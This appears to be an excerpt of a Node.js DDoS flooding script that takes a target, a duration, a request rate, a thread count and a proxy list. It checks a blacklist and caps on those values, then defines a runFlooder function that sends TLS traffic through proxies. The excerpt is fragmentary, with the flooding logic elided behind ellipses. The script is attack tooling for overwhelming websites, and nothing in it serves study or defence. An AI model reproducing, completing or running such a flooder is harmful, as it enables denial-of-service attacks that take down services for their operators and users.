...
'*'
 ...
 if (process.argv.length < 7) {
  console.log('node tls target time rate thread proxy');
  process.exit();
}
 const headers = {};
...
if (blackList.includes(args.target)) {
  console.log("This website is blacklist");
  process.exit(1);
}

if (args.time < 0 || args.time > 300) {
  console.log("Max time is 300.");
  process.exit(1);
}

if (args.Rate < 0 || args.Rate > 1024) {
  console.log("Max rate is 1024");
  process.exit(1);
}

if (args.threads < 0 || args.threads > 256) {
  console.log("Max thread is 256");
  process.exit(1);
}
...
console.log('Type: HTTP1.1/HTTP2/HTTP3/TLSv1.1/TLSv1.2/TLSv1.3');
  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);
 ...
 function runFlooder() {
     ...
     Header.HTTP(proxyOptions, (connection, error) => {
        ...
        const tlsOptions = {
            ...
            servername: isIPAddress(parsedTarget.host) ? undefined : parsedTarget.host,
